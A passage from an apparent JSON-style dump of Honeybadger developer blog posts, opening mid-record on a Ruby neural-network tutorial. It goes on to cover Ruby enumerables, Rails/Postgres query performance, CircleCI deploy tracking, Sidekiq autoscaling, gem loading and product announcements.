x_test_data, run our model on each one, and add it to our predicted array. x_test_data . each do | params | predicted . push ( model . run ( params ). map { | e | e . round } ) end # Compare the predicted results with the actual results. correct = predicted . collect . with_index { | e , i | ( e == y_test_data [ i ]) ? 1 : 0 }. inject { | sum , e | sum + e } # Print out the accuracy rate. puts \"Accuracy: #{ (( correct . to_f / testing_size ) * 100 ). round ( 2 ) } % - test set of size #{ testing_percentage } %\" Let's run our program and see what happens! ruby neural-net.rb You should see a lot of output for the Epochs, but at the bottom, you should see something like this: Accuracy: 56.82% - test set of size 20.0% Oof, that is not very good! But, let's come up with our own data points and run the model. prediction = model . run ( [ 1 , 1 ] ) # Round the output to get the prediction. puts \"Algorithm predicted class: #{ prediction . map { | e | e . round } }\" prediction_two = model . run ( [ 5 , 4 ] ) # Round the output to get the prediction. puts \"Algorithm predicted class: #{ prediction_two . map { | e | e . round } }\" Here, we have two examples. For the first, we're passing in 1s for our weekday and weekend alcohol consumption. If I were a betting person, I would guess that this student would have a final grade above 10 (i.e., a 1). The second example passes in high values (5 and 4) for alcohol consumption, so I would guess that this student would have a final grade equal to or below 10 (i.e., a 0.) Let's run our program again and see what happens! Your output should look something like this: Algorithm predicted class: [1]\nAlgorithm predicted class: [0] Our model appears to do what we'd expect for the numbers on either the lower or higher end of the spectrum. But, it struggles when numbers are opposites (feel free to try out different combinations -- 1 and 5, or 2 and 3 as examples) or in the middle. We can also see from our Epoch data that, while the error does decrease, it remains very high (mid-20%.) What this means is there may not be a relationship between alcohol consumption and course grades. I encourage you to play around with the original dataset from Kaggle -- are there other independent variables that we could use to predict course outcomes? Wrap-Up There are a lot of intricacies (mostly with regards to the math) that happen under the hood to make all this work. If you're curious and want to learn more, I highly recommend looking through the docs on FANN or looking at the source code for the ruby-fann gem. I also recommend checking out the \"AlphaGo\" documentary on Netflix -- it doesn't require a lot of technical knowledge to enjoy it and gives a great, real-life example of how deep learning is pushing the limits of what computers can accomplish. Will Kurzweil end up being correct with his prediction? Only time will tell!", "date": "2020-05-12"},
{"website": "Honey-Badger", "title": "Incoming: uptime monitoring WebHooks", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/incoming-uptime-monitoring-webhooks/", "abstract": "When your site is totally unresponsive (i.e. down), it's a big deal. Oddly enough, application errors may not surface during major outages if the failure is outside of the application. That's why we built uptime monitoring into Honeybadger: in addition to monitoring your app for internal exceptions, we also ping external endpoints from multiple locations around the world to make sure it's online and responding as expected. When your site is down we can notify you via email, SMS, Slack, or any of our other myriad notification options. One feature which we didn't have is the ability to send a WebHook when an outage occurs (or is resolved) - until now! Starting today you can optionally enable uptime notifications for our WebHooks integration: To add the WebHook integration to your Honeybadger project, visit the \"Integrations\" tab from your Project Settings page and find the WebHook integration. Check out this gist for the payload format which we'll post to the URL you configure. If you aren't quite sure how WebHooks work, they are basically a way to send information about events (usually in JSON format) over HTTP, which is a common language which most apps can speak. It's a great way to integrate 3rd party services in new and interesting ways. For example, when your app goes down we could send a POST request to your internal monitoring system so that it can handle notifying your ops team of the outage, do extra logging, etc. Learn more about WebHooks at webhooks.org .", "date": "2015-03-17"},
{"website": "Honey-Badger", "title": "Slicing and Dicing Ruby Enumerables", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/ruby-enumerable-slicing-before-when-and-after/", "abstract": "Today we're going to talk about slice_before , slice_when and slice_after . These are super-useful methods when you need to group items in an array or other enumerable based on arbitrary criteria. You're probably familiar with Array#slice . It lets you pull out a subset of an array based on a range of indices: a = [ \"a\" , \"b\" , \"c\" ] a . slice ( 1 , 2 ) # => [\"b\", \"c\"] This is useful, but it can't be used with enumerables, because enumerables don't have indices. The slice_before , slice_when and slice_after methods don't rely on indices - so you can use them with any enumerable. Let's take a look! Using Enumerable#slice_before Enumerable#slice_before splits and enumerable into groups at the point before a match is made. The match is made via the === operator, which means that you can match all kinds of things. Value Matches You can match a single value. That should be obvious. :) a = [ \"a\" , \"b\" , \"c\" ] a . slice_before ( \"b\" ). to_a # => [[\"a\"], [\"b\", \"c\"]] Regular Expression Matches You can use regular expressions for more complex textual matching. a = [ \"000\" , \"b\" , \"999\" ] a . slice_before ( /[a-z]/ ). to_a # => [[\"000\"], [\"b\", \"999\"]] Range Matches If you're working with numbers, you can slice the array based on a range. a = [ 100 , 200 , 300 ] a . slice_before ( 150 .. 250 ). to_a # => [[100], [200, 300]] Class matches This one may seem a little strange to you, but it's fully in keeping with the behavior of the === operator. a = [ 1 , \"200\" , 1.3 ] a . slice_before ( String ). to_a # => [[1], [\"200\", 1.3]] Using a block If none of the other options are flexible enough for you can always to find a match programmatically with a block. a = [ 1 , 2 , 3 , 4 , 5 ] a . slice_before do | item | item % 2 == 0 end # => [[1], [2, 3], [4, 5]] Using Enumerable#slice_after Enumerable#slice_after works exactly like Enumerable#slice_before except that the slice happens after the match. Go figure. :-) a = [ \"a\" , \"b\" , \"c\" ] a . slice_after ( \"b\" ). to_a # => [[\"a\", \"b\"], [\"c\"]] Of course, you can match using regular expressions, ranges, and blocks. I'm not going to show examples of those here because it would be tedious. Using Enumerable#slice_when Enumerable#slice_when is a different beast from slice_before and slice_after . Instead of matching a single item in the array, you match a pair of adjacent items. This means that you can group items based on the \"edges\" between them. For example, here we group items based on \"nearness\" to their adjacent items. a = [ 1 , 2 , 3 , 100 , 101 , 102 ] # Create a new group when the difference # between two adjacent items is > 10. a . slice_when do | x , y | ( y - x ) > 10 end # => [[1, 2, 3], [100, 101, 102]] If you're interested in learning more, check out the Ruby Docs for slice_when . They have several great code examples. Arrays vs Enumerables I've used arrays in most of the examples above because arrays are easy to understand. You should keep in mind though that you can use slice_before , slice_when and slice_after with any enumerable. For example, if you had a file containing a bunch of emails, you could split out the individual emails using slice_before . The code below is taken from the docs . open ( \"mbox\" ) { | f | f . slice_before { | line | line . start_with? \"From \" }. each { | mail | puts mail } And be sure to notice that the slice methods don't return arrays. They return enumerables. That means that you can use map , each and all your other favorite enumerable methods on the. Heck, you could even do another split. :)", "date": "2015-11-10"},
{"website": "Honey-Badger", "title": "Common Rails Idioms that Kill Database Performance", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/common-rails-idioms-that-kill-database-performance/", "abstract": "I remember the first time I saw rails' ActiveRecord. It was a revelation. This was back in 2005 and I was hand-coding SQL queries for a PHP app. Suddenly, using the database went from being a tedious chore, to being easy and - dare I say - fun. ...then I started to notice the performance issues. ActiveRecord itself wasn't slow. I'd just stopped paying attention to the queries that were actually being run. And it turns out, some of the most idiomatic database queries used in Rails CRUD apps are by-default quite poor at scaling up to larger datasets. In this article we're going to discuss three of the biggest culprits. But first, let's talk about how you can tell if your DB queries are going to scale well. Measuring Performance Every DB query is performant if you have a small enough dataset. So to really get a feel for performance, we need to benchmark against a production-sized database. In our examples, we're going to use a table called faults with around 22,000 records. We're using postgres. In postgres, the way you measure performance is to use explain . For example: # explain (analyze) select * from faults where id = 1;\n                                     QUERY PLAN\n--------------------------------------------------------------------------------------------------\n Index Scan using faults_pkey on faults  (cost=0.29..8.30 rows=1 width=1855) (actual time=0.556..0.556 rows=0 loops=1)\n   Index Cond: (id = 1)\n Total runtime: 0.626 ms This shows both the estimated cost to perform the query (cost=0.29..8.30 rows=1 width=1855) and the actual time it took to perform it (actual time=0.556..0.556 rows=0 loops=1) If you prefer a more readable format, you can ask postgres to print the results in YAML. # explain (analyze, format yaml) select * from faults where id = 1;\n              QUERY PLAN\n--------------------------------------\n - Plan:                             +\n     Node Type: \"Index Scan\"         +\n     Scan Direction: \"Forward\"       +\n     Index Name: \"faults_pkey\"       +\n     Relation Name: \"faults\"         +\n     Alias: \"faults\"                 +\n     Startup Cost: 0.29              +\n     Total Cost: 8.30                +\n     Plan Rows: 1                    +\n     Plan Width: 1855                +\n     Actual Startup Time: 0.008      +\n     Actual Total Time: 0.008        +\n     Actual Rows: 0                  +\n     Actual Loops: 1                 +\n     Index Cond: \"(id = 1)\"          +\n     Rows Removed by Index Recheck: 0+\n   Triggers:                         +\n   Total Runtime: 0.036\n(1 row) For now we're only going to focus on \"Plan Rows\" and \"Actual Rows.\" Plan Rows In the worst case, how many rows will the DB have to loop through to respond to your query Actual Rows When it executed the query, how many rows did the DB actually loop through? If \"Plan Rows\" is 1, like it is above, then the query is probably going to scale well. If \"Plan Rows\" is equal to the number of rows in the database, that means the query is going to do a \"full table scan\" and is not going to scale well. Now that you know how to measure query performance, let's look at some common rails idioms and see how they stack up. Counting It's really common to see code like this in Rails views: Total Faults <%= Fault . count %> That results in SQL that looks something like this: select count ( * ) from faults ; Let's plug the in to explain and see what happens. # explain (analyze, format yaml) select count(*) from faults;\n              QUERY PLAN\n--------------------------------------\n - Plan:                             +\n     Node Type: \"Aggregate\"          +\n     Strategy: \"Plain\"               +\n     Startup Cost: 1840.31           +\n     Total Cost: 1840.32             +\n     Plan Rows: 1                    +\n     Plan Width: 0                   +\n     Actual Startup Time: 24.477     +\n     Actual Total Time: 24.477       +\n     Actual Rows: 1                  +\n     Actual Loops: 1                 +\n     Plans:                          +\n       - Node Type: \"Seq Scan\"       +\n         Parent Relationship: \"Outer\"+\n         Relation Name: \"faults\"     +\n         Alias: \"faults\"             +\n         Startup Cost: 0.00          +\n         Total Cost: 1784.65         +\n         Plan Rows: 22265            +\n         Plan Width: 0               +\n         Actual Startup Time: 0.311  +\n         Actual Total Time: 22.839   +\n         Actual Rows: 22265          +\n         Actual Loops: 1             +\n   Triggers:                         +\n   Total Runtime: 24.555\n(1 row) Woah! Our simple count query is looping over 22,265 rows — the entire table! In postgres, counts always loop over the entire record set. You can decrease the size of the record set by adding where conditions to the query. Depending on your requirements, you may get the size low enough where performance is acceptable. The only other way around this issue is to cache your count values. Rails can do this for you if you set it up: belongs_to :project , :counter_cache => true Another alternative is available when checking to see if the query returns any records. Instead of Users.count > 0 , try Users.exists? . The resulting query is much more performant. (Thanks to reader Gerry Shaw for pointing this one out to me.) Sorting The index page. Almost every app has at least one. You pull the newest 20 records from the database and display them. What could be simpler? The code to load the records might look a little like this: @faults = Fault . order ( created_at: :desc ) The sql for that looks like this: select * from faults order by created_at desc ; So let's analyze it: # explain ( analyze , format yaml ) select * from faults order by created_at desc ; QUERY PLAN -------------------------------------- - Plan : + Node Type : \"Sort\" + Startup Cost : 39162 . 46 + Total Cost : 39218 . 12 + Plan Rows : 22265 + Plan Width : 1855 + Actual Startup Time : 75 . 928 + Actual Total Time : 86 . 460 + Actual Rows : 22265 + Actual Loops : 1 + Sort Key : + - \"created_at\" + Sort Method : \"external merge\" + Sort Space Used : 10752 + Sort Space Type : \"Disk\" + Plans : + - Node Type : \"Seq Scan\" + Parent Relationship : \"Outer\" + Relation Name : \"faults\" + Alias : \"faults\" + Startup Cost : 0 . 00 + Total Cost : 1784 . 65 + Plan Rows : 22265 + Plan Width : 1855 + Actual Startup Time : 0 . 004 + Actual Total Time : 4 . 653 + Actual Rows : 22265 + Actual Loops : 1 + Triggers : + Total Runtime : 102 . 288 ( 1 row ) Here we see that the DB is sorting all 22,265 rows every single time you do this query. No bueno! By default, every \"order by\" clause in your SQL causes the record set to be sorted right then, in real-time. There's no caching. No magic to save you. The solution is to use indexes. For simple cases like this one, adding a sorted index to the created_at column will speed up the query quite a bit. In your Rails migration you could put: class AddIndexToFaultCreatedAt < ActiveRecord :: Migration def change add_index ( :faults , :created_at ) end end Which runs the following SQL: CREATE INDEX index_faults_on_created_at ON faults USING btree ( created_at ); There at the very end, (created_at) specifies a sort order. By default it's ascending. Now, if we re-run our sort query, we see that it no longer includes a sorting step. It simply reads the pre-sorted data from the index. # explain ( analyze , format yaml ) select * from faults order by created_at desc ; QUERY PLAN ---------------------------------------------- - Plan : + Node Type : \"Index Scan\" + Scan Direction : \"Backward\" + Index Name : \"index_faults_on_created_at\" + Relation Name : \"faults\" + Alias : \"faults\" + Startup Cost : 0 . 29 + Total Cost : 5288 . 04 + Plan Rows : 22265 + Plan Width : 1855 + Actual Startup Time : 0 . 023 + Actual Total Time : 8 . 778 + Actual Rows : 22265 + Actual Loops : 1 + Triggers : + Total Runtime : 10 . 080 ( 1 row ) If you're sorting by multiple columns, you'll need to create an index that is sorted by multiple columns as well. Here's what that looks like in a Rails migration: add_index ( :faults , [ :priority , :created_at ], order: { priority: :asc , created_at: :desc ) As you start doing more complex queries, it's a good idea to run them through explain . Do it early and often. You may find that some simple change to the query has made it impossible for postgres to use the index for sorting. Limits and Offsets In our index pages we hardly ever include every item in the database. Instead we paginate, showing only 10 or 30 or 50 items at a time. The most common way to do this is by using limit and offset together. In Rails it looks like this: Fault . limit ( 10 ). offset ( 100 ) That produces SQL which looks like this: select * from faults limit 10 offset 100 ; Now if we run explain, we see something odd. The number of rows scanned is 110, equal to the limit plus the offset. # explain ( analyze , format yaml ) select * from faults limit 10 offset 100 ; QUERY PLAN -------------------------------------- - Plan : + Node Type : \"Limit\" + ... Plans : + - Node Type : \"Seq Scan\" + Actual Rows : 110 + ... If you change the offset to 10,000 you'll see that the number of rows scanned jumps to 10010, and the query is 64x slower. # explain ( analyze , format yaml ) select * from faults limit 10 offset 10000 ; QUERY PLAN -------------------------------------- - Plan : + Node Type : \"Limit\" + ... Plans : + - Node Type : \"Seq Scan\" + Actual Rows : 10010 + ... This leads to a disturbing conclusion: when paginating, later pages are slower to load than earlier pages. If we assume 100 items per page in the example above, page 100 is 13x slower than page 1. So what do you do? Frankly, I haven't been able to find a perfect solution. I'd start by seeing if I could reduce the size of the dataset so I didn't have to have 100s or 1000s of pages to begin with. If you're unable to reduce your record set, your best bet may be to replace offset/limit with where clauses. # You could use a date range Fault . where ( \"created_at > ? and created_at < ?\" , 100 . days . ago , 101 . days . ago ) # ...or even an id range Fault . where ( \"id > ? and id < ?\" , 100 , 200 ) Conclusion I hope this article has convinced you that you should really be taking advantage of postgres' explain function to find possible performance issues with your db queries. Even the simplest queries can cause major performance issues, so it pays to check. :)", "date": "2017-01-03"},
{"website": "Honey-Badger", "title": "Just Launched: Search Improvements!", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/search-datepicker-announcement/", "abstract": "Big improvements are coming to search at Honeybadger! To kick things off, we're proud to announce (drumroll please) a date picker! What's so great about a date picker? It used to be that if you wanted to search for errors within a custom date range, you had to manually enter something like this: occurred:[2017-01-02T00:00:00Z to NOW] As you can guess, we've had a lot of requests for a better user experience. Now you have it. Whenever you click on a \"search custom date\" link, or start typing a date query a handy date picker pops up. We've also added a new, human-friendly syntax for date related queries: occurred.before:\"2017-01-02 00:00 UTC-7\"\noccurred.after:\"last monday\"\noccurred.after:\"jan\" occurred.before:\"mar\" More on the way The great thing about this new feature isn't the date picker itself. It's the fact that we now have the structure in place to add more context-sensitive search behavior. So the search UI will continue to get better for some time. You can expect to see: An easier-to-read, less cluttered search bar. Better surfacing of advanced search features. Better handling of long lists of users, environment names, etc. More autocompletion and less typing Easier access to past searches", "date": "2017-06-28"},
{"website": "Honey-Badger", "title": "Wrapping Up ElixirConf 2018", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/elixirconf-2018/", "abstract": "I'm on the 6:10pm Amtrak Cascades out of Seattle, scheduled to arrive in Portland at 10:00pm. After two intense days in Bellevue, I'm exhausted, but wired. A group of young guys two rows up are loudly discussing their favorite AWS services; I wonder if they're also returning from ElixirConf, but then I remember that this is Seattle—half the city works in tech. An older guy across the isle from them has his feet propped up on the unoccupied reverse seat in front of him. He's wearing slip-ons, crew socks, Levi's, and a striped polo shirt. He eventually strikes up a conversation with the kids (who work at Amazon), and I eavesdrop that he's with Microsoft. Half the city works in tech. He says he works on \"a big hardware team\", but conspicuously won't say which one. This was my 3rd ElixirConf. I remember how striking the growth in attendance was between 2015 in Austin and 2017 in Bellevue—the conference seemed to double in size (I skipped 2016 due to becoming a parent). This year felt more established, with good attendance, but not noticeably larger (excluding the addition of Aaron Patterson ). Maybe it's just that everything felt familiar being in Bellevue for a second year. The general vibe I got this year was that Elixir is stable, and investing in the long-term. DockYard announced some ambitious 5 to 10-year goals of running BEAM on WebAssembly, and getting Elixir into the top 10 most popular programming languages in the world. Boyd Multerer (speaking of secretive Microsoft guys) released the library that he's been quietly building for the past several years —a client application framework for embedded and IoT devices, called Scenic (it's truly impressive). Chris McCord announced Phoenix.LiveView , a way to develop rich client-side applications without JavaScript . Deploying Elixir is still the topic of the day, but the discussion is maturing. According to Jose Valim , Releases in Distillery 2.0 (recently released) are still the best way to deploy Elixir today, and they will eventually include a trimmed-down version of releases in Elixir itself. Some Elixir-focused PaaS offerings are also beginning to appear (I heard a lot about Gigalixer ). In his talk, \"Docker and OTP: Friends or Foes?\", Daniel Azuma showed us how it's possible to blend the good parts of OTP and Cloud Native to reap the benefits of stateful processes and distributed OTP applications on Docker/Kubernetes. Daniel's talk felt really important to me; he pointed out that Elixir is split over ideology of deploying OTP applications. Purists want to squeeze every last drop of performance out of their hardware, which naturally resists virtualization. On the other hand, the industry at large is currently diving into containers (the Google results for that phrase are funny), which are built on multiple layers of virtualization. His call to action was rather than embracing one at the expense of the other, let's work together to create tooling which is new and unique. There's still a lot of work to be done, but as my friend Derrick recently wrote on Twitter , the future of Elixir is bright. ElixirConf 2019 will be in Aurora, CO. See you there!", "date": "2018-09-09"},
{"website": "Honey-Badger", "title": "Harness Your Deployment Superpowers With Honeybadger's Orb For CircleCI", "author": ["Ben Findley"], "link": "https://www.honeybadger.io/blog/track-deployments-as-a-part-of-your-workflow-with-the-honeybadger-orb/", "abstract": "Palantir orbs, the Globe of Peace, Thief Raid, Trine, Prophecy Records, Ood Translators — the list of important orbs throughout history is quite long. However, the Honeybadger orb for CircleCI gives you deployment super powers. Do those other “important” orbs offer this feature? I didn’t think so! The Honeybadger Orb Using Honeybadger’s orb allows your team to easily track deployments as part of your workflow. Keeping track of deployments in Honeybadger gives you a heads-up when code changes cause problems, helping you avoid situations where you \"fire and forget\" on a Friday afternoon... and cause an outage that lasts all weekend. Once added to your workflow, our orb will automatically include the SHA of the revision that was deployed, which we link in the Honeybadger UI to GitHub, GitLab, or Bitbucket, so you can see at a glance what got deployed and when. Easy Integration To use this orb in your project, you need to enable two settings: Settings -> Security -> Allow uncertified orbs Settings -> Advanced Settings -> Enable build processing (preview) Complete installation and configuration instructions can be found here . Deployment Notifications Sending deployment notifications to Honeybadger allows your team to associate\nspikes in errors to changes that were deployed. You can add a job definition to circle.yml that invokes the notify_deploy command from this orb: jobs : test : ... deploy : docker : - image : circleci/ruby:2.5.3-node-browsers steps : - run : ... - honeybadger/notify_deploy : api_key : YOUR_HONEYBADGER_API_KEY Then include that job in your workflow: workflows : test : jobs : - test - deploy : requires : - test This will invoke the deploy job after the test job is completed. Source Map Uploads If you are tracking your Javascript errors with Honeybadger, our orb can also upload your source maps to our API every time your assets are compiled. Having those source maps uploaded as your app is deployed is incredibly helpful when you get a Javascript error in your app. Instead of getting a backtrace with minified, obfuscated code references, you'll get a backtrace with the original code as you wrote it. You'll be able to find and fix those Javascript bugs in no time. The upload_sourcemap command can be used in your workflow to send source\nmaps to Honeybadger after they are generated by your build tools: jobs : test : ... deploy : docker : - image : circleci/ruby:2.5.3-node-browsers steps : - run : ... - honeybadger/upload_sourcemap : api_key : YOUR_HONEYBADGER_API_KEY minified_url : https://example.com/assets/application.min.js minified_file : path/to/application.min.js source_map : path/to/application.js.map Wrapping Up Take your CircleCI deployments to the next level with the Honeybadger orb (A.K.A. The Most Important Orb Ever). Give it a try and let us know what you think!", "date": "2019-09-16"},
{"website": "Honey-Badger", "title": "Link to Your User Admin", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/link-to-your-user-admin/", "abstract": "Our latest feature saves you a click or two — and you're going to love it. You probably already know that Honeybadger can let you know which users were impacted by an error in your Rails application. By using the context feature you can send custom data, such as a user id and a user email address, along with the other application data that's automatically sent with each error report. I use this all the time to quickly email people to let them know that the error they just encountered at my site has already been fixed. They love that. :) Before today, though, you had to copy the user email address or user id from the Honeybadger UI to paste into your mail client or adminstration tool. Who wants to do all that work? With today's update, you'll now see a button to email a user affected by an error if that user's email address is in the context data. And if you also pass along a user id in the context, we can also give you button to open that user record in your app's admin tool. Here's how you can set it up: Go to the settings for your Honeybadger project and choose the Edit tab. You'll see an input labeled \"User URL\". Use that field to enter a URL that can be used a template for creating a link to a user record in your admin tool. For example, if you entered http://mysite.com/admin/user/[user_id] , and if a user with the id 42 triggered an error in your application, the error view in Honeybadger would have a link to http://mysite.com/admin/user/42 . Cool, huh? Now you have an even better chance of contacting your users about an error they encountered before they have a chance to contact you. :)", "date": "2014-09-16"},
{"website": "Honey-Badger", "title": "New and Improved Search", "author": ["Benjamin Curtis"], "link": "https://www.honeybadger.io/blog/new-and-improved-search/", "abstract": "Over the past few months we've been working on delivering an improved search experience for Honeybadger customers, and today we're happy to announce that it's finally ready.  Our goal was to provide more advanced search options for the data you've been sending us while keeping simple searches simple, and I think we've accomplished that.  We'll still support the simple \"just enter some text to do a quick wildcard search\", but now we'll also support more specific searches, like the following: If you'd like to search \"all errors encountered by people using Chrome\", you can type this into our search box: request.user_agent:*Chrome* You can also do negative searches, like if you wanted to ignore Googlebot: -request.user_agent:*Googlebot* You could save a bookmark to a search that returns every error that happened in the past day to visit as part of your daily routine: occurred:[NOW-24HOUR TO NOW] And you can search deep within the hashes of data that are sent to us when an error is reported, like the context or params: context.user.favorites.color:blue We've updated the navigation links next to our search box to generate search filters like -is:resolved and assignee:theintern@yourcompany.com so you can easily see what filters are being applied to your search and save your search for later. We think you'll love the new error search in Honeybadger!  Check out the search documentation , give it a try, and let us know what you think.", "date": "2015-09-14"},
{"website": "Honey-Badger", "title": "New! Error Monitoring, Now for PHP 7.", "author": ["Sophia Le"], "link": "https://www.honeybadger.io/blog/honeybadger-for-php/", "abstract": "Truth: You wrote your web app in PHP. And you really wish you could monitor it the same way you monitor your Ruby ones. Luckily, we can make your dream come true! Note: This release is for the official version of Honeybadger for PHP . However, we did have a previous version , courtesy of Gabe Evans . What's changed? Support for PHP 7. The previous version was tested only on versions 5.5 and 5.6. Conformity with our Read, Collector, and Deployment Tracking APIs. Check out our documentation guide for more details. Support for Laravel. There's custom setup that's required but no need to panic: We have instructions. Questions or comments? Let us know at support@honeybadger.io or via Twitter at @honeybadgerapp . Get Honeybadger for PHP", "date": "2016-09-20"},
{"website": "Honey-Badger", "title": "Cleanly Scaling Sidekiq", "author": ["Benjamin Curtis"], "link": "https://www.honeybadger.io/blog/cleanly-scaling-sidekiq/", "abstract": "Earlier in the year we migrated from a dedicated server hosting facility\nto AWS, and we're very glad we did.  We're happy to have a bunch of\nautomation in place, as we get to spend less time fiddling with servers\nthat way. :)  This post describes what happens in our infrastructure\nwhen we have changes in the volume of error notifications that we\nare processing. How We Scale Our processing pipeline relies heavily on Sidekiq , which has been\nrock-solid for us.  The majority of the work in the pipeline is handled\nby instances that belong to an autoscaling group.  When the Sidekiq\nbacklog increases, a CloudWatch alarm triggers, causing new instances to\nbe started in this group.  As the traffic subsides and the backlog\ndisappears, instances are terminated. How We Scale, With Style The only snag in this setup is that we'd like to make sure the Sidekiq\nworkers finish doing all of their work before an instance gets\nterminated.  Even though Sidekiq supports rescheduling jobs that get\nterminated before completion, we prefer to avoid that when we can\n— it's better to take a few extra seconds to finish a job than to\nhave it rescheduled and restarted.  Fortunately, in its awesomeness,\nSidekiq has a method for telling worker processes to stop accepting new\nwork after the current job is completed, making it easy to drain workers\nin preparation for termination.  The trick is letting those workers know\nthat they need start draining — and for that, we use a combination\nof Lifecycle Hooks , CloudWatch Events + Lambda , EC2 Simple Systems Manager , and a wee bit of code. The rest of this post will show you how you can copy our setup to get\ninstances that go gently into that good night. Prerequisites Naturally, you'll need an autoscaling group that has a scaling policy\nthat terminates instances based on some rule you define.  In addition to\nthat, you'll need to have your instances configured to run the SSM Agent and running in a role that has SSM access .\nThese instances will also need to have permissions to interact with the\nautoscaling API.  Here's a policy document for the instance role: The Code Once those items are in place, you can start connecting the pieces\ntogether.  We'll start at the end of the process — our scripts that\nwill live on the instance and handle Sidekiq draining — and we'll work\nour way backwards.  First, the Ruby code that will quiet the workers and\nwait for them to finish working: We get a list of Sidekiq processes that are running on the current\ninstance via the Sidekiq API, tell them to stop accepting new work, then\nwait until all the processes have no active jobs. Here is the shell script that will trigger that script when it's time to\nterminate the instance: There's a lot of setup to do, but the meat of this script starts at line\n8.  First we signal to the autoscaling group that we are working on the\nlifecycle hook.  This has the side-effect of being a guard — if\nthis instance hasn't been scheduled for termination by the autoscaling\ngroup, then this command will fail, and the worker shutdown script won't\nbe invoked.  This script shouldn't be called unless the instance has\nbeen scheduled for termination, but it doesn't hurt to be a little\ndefensive. :)  Assuming we are moving forward, we shut down the workers,\nand then we tell the autoscaling group to go ahead with the termination.\nIf we don't make that API call, then the instance will remain running\nuntil the expiration of the hook's timeout (we'll get to that in a bit). The SSM Document Now we need something that will trigger this shell script.  That's where\nthe SSM agent comes in.  It's happily running in the background, waiting\nfor a Document to show up via SendCommand to tell it what to do.  Our\nDocument instructs the agent to run the termination script: You can create your Document by clicking the Documents link in the\nSystems Manager Shared Resources section of the EC2 console (near the\nbottom of the sidebar), clicking the Create Document button, and\ndropping that JSON into the Content box. The Lambda Function With your Document in place, create a Lambda function that will run it\non the target instance when it's time to terminate an instance.  Here's\nsome code for that: You will need to replace PrepInstanceForTermination with whatever\nname you chose for your Document, but otherwise this code is just\ncopy-and-paste. This Lambda function needs a couple of permissions (in addition to the\nusual Lambda permissions), and here's an IAM policy document for that: Again, you may need to replace the Document name. The Hook and the Event Rule Hang in there — we're almost there!  You have two things left do:\ncreate the Cloudwatch Event and the Lifecycle Hook.  First, the Event: In the CloudWatch management console, click Events in the sidebar, and\nthen click the Create rule button.  This is what will trigger the Lambda\nfunction you just created. On the left you pick the event you want to watch and any additional\ncharacteristics about that event (like limiting which autoscaling groups\nwill trigger this event), and on the right you pick the target of the\nrule — in our case, the Lambda function we created earlier.  You don't\nneed to change any of the defaults for the Lambda function target. Once that's done, head back to the EC2 management console and navigate\nto the autoscaling group that has the instances you want to manage.\nAfter clicking on the Lifecycle Hooks tab, you'll be able create a hook.\nOurs looks like this: Terminate is the transition we're interested in, and we'd like the\ntermination to go ahead (Default Result: CONTINUE) if for some reason\nthe API call doesn't happen in our shell script after 600 seconds\n(Heartbeat Timeout) have elapsed.  This will result in our instances\nbeing terminated one way or another, even if the Sidekiq workers aren't\ndone, after 10 minutes. That's a Wrap You made it!  You now have an autoscaling group that can terminate its\nSidekiq instances in a humane way.  Enjoy! P.S.: Credit goes to awslabs for a super-helpful tutorial on\nputting some of these pieces together.", "date": "2017-10-31"},
{"website": "Honey-Badger", "title": "How do Ruby Gems work?", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-ruby-gems-work/", "abstract": "One of the things that makes working with Rails so nice is that for any common programming need---authorization, site administration, ecommerce, you name it---someone smarter than you has likely coded up the solution for your problem and packaged it up in the form of a gem. You can certainly add gems to your Gemfile and take full advantage of their usefulness without truly understanding how they work, but have you ever been curious how it all gets wired up? Here we'll take a closer look at Ryan Bates' CanCan authorization gem and answer the following questions (which, if asked more broadly, could apply to any gem): Where does the code for CanCan get stored? Where is the can? method defined? When/where/how does Rails load the code for CanCan? First, I have CanCan in my Gemfile and I do a bundle install : # Gemfile gem \"cancan\" , \"~> 1.6.10\" ``` $ bundle install With Bundler it's actually really easy to see where any particular gem lives. Just use bundle show : $ bundle show cancan\n/Users/jasonswett/.rvm/gems/ruby-2.0.0-p0/gems/cancan-1.6.10 That takes care of question #1. Now where is can? defined? $ cd /Users/jasonswett/.rvm/gems/ruby-2.0.0-p0/gems/cancan-1.6.10 $ grep -r 'def can?' * lib/cancan/ability.rb: def can? ( action, subject, * extra_args ) lib/cancan/controller_additions.rb: def can? ( * args ) It looks like there are actually two different can? functions. The one we're interested in is in lib/cancan/ability.rb . # lib/cancan/ability.rb def can? ( action , subject , * extra_args ) match = relevant_rules_for_match ( action , subject ). detect do | rule | rule . matches_conditions? ( action , subject , extra_args ) end match ? match . base_behavior : false end As far as what's actually happening here, your guess is as good as mine, but that's not the important part. The takeaway here is that if you're bumping up against some problem with a gem, you're now equpped to dig into the gem's code to try to figure out what's going on. Now that we know where a gem's code is kept and how to get into it, how does Rails know about a gem, and when does it load a gem's code? This is covered in a certain section of the Rails initialization documentation . Here's the relevant part: In a standard Rails application, there's a Gemfile which declares all dependencies of the application. config/boot.rb sets ENV['BUNDLE_GEMFILE'] to the location of this file. If the Gemfile exists, bundler/setup is then required. This happens early on in the initialization process: the second step, to be exact. This makes sense since if your project depends on a certain gem, who knows where you might reference it. Better load it as early as possible so its code can be used anywhere.", "date": "2014-02-05"},
{"website": "Honey-Badger", "title": "Honeybadger is #winning", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/rails-rumble-2012-roundup/", "abstract": "The results are in: Honeybadger was able to grab a 50% market share of winning apps at Rails Rumble ! Amid strong competition (in an apparently crowded market), the 'badger has landed as the clear favorite: So, you might ask, who all used Honeybadger to keep their apps bug free? We asked that too, and here's what we found, at least according to Google : Revision.io is a tool for software teams to be able to easily create embeddable, shareable changelogs based on their GitHub activity. findthin.gs makes it easy to find the best online sources for tv series and movies that are available for you to watch online or to buy / rent and watch offline. CinderellaApp uses geolocation to reunite lost and found items with their rightful owners. Score Anything tracks your progress against your opponents for all manner of sports. FaxItForMe lets you send faxes online. Oh Dear is the kindest bug reporting tool on the planet. DashHub is an \"Awesome Dashboard for your Github Application\" Flicky finds the patterns in the articles you've saved for later. PinMap makes it easy to track any topic on a map and let's you share it with your friends through Facebook, Twitter, email or any website. Trollr - We're not really sure what Trollr does, but we're sure glad they used Honeybadger! Great job, everyone. Looking forward to working with all the contestants in the coming months.", "date": "2012-10-27"},
